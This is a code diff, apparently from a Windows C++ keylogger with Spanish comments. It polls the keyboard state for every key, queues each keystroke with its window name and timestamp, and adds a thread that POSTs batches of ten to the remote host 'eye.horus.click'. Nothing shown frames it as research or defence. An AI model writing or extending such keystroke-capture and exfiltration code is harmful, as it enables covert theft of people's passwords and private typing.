@@ -450,6 +450,7 @@ DWORD WINAPI Send_to_WS(LPVOID lpParam) {
 		string ruta = "/evento/" + str_key.nombre;
 		HttpsWebRequestPost("eye.horus.click", ruta, body);
 	}
+	return 1;
 }
 //--Implementación del hilo--
 
@@ -464,19 +465,15 @@ int main() {
 	cout << "Timestamp\t\t\t";
 	cout << "Nombre\n";
 	cout << "----------------------------------------------------------------------------\n";
-	
+
 	while (TRUE) {
 		Sleep(10);
-		//Revisar el contenido de la cola, generar un hilo asíncrono y vaciarla para enviarla al web service
-		if (QUEUE->size == 10) {
-
-		}
 		for (key = 8; key <= 255; key++) {
 			if (GetAsyncKeyState(key) == -32767) {
 
 				if (TeclasPulsadas(key) == FALSE) {
 					str_key.key = key;
-					
+
 					Node* a = getNode(&str_key);
 					Enqueue(QUEUE, a);
 
@@ -489,14 +486,37 @@ int main() {
 						"}";
 					string ruta = "/evento/" + str_key.nombre;
 					HttpsWebRequestPost("eye.horus.click", ruta, body);
-
 					*/
+
+					//Revisar el contenido de la cola, generar un hilo asíncrono y vaciarla para enviarla al web service
+					if (QUEUE->size == 10) {
+						//Variables para el funcionamiento del proceso
+						DWORD dwThreadId;
+						HANDLE hThread;
+
+						hThread = CreateThread(
+							NULL,
+							0,
+							Send_to_WS,
+							QUEUE,
+							0,
+							&dwThreadId
+						);
+
+						if (hThread == NULL)
+							cout << "Error al crear el proceso";
+						else {
+							WaitForSingleObject(hThread, INFINITE);
+							CloseHandle(hThread);
+						}
+					}
+
 					//Impresión de depuración
-					cout << str_key.key+"\t";
-					cout << str_key.ventana+"\t";
-					cout << str_key.tiempo+"\t";
-					cout << str_key.nombre+"\n";
-					
+					cout << str_key.key + "\t";
+					cout << str_key.ventana + "\t";
+					cout << str_key.tiempo + "\t";
+					cout << str_key.nombre + "\n";
+
 				}
 			}
 		}
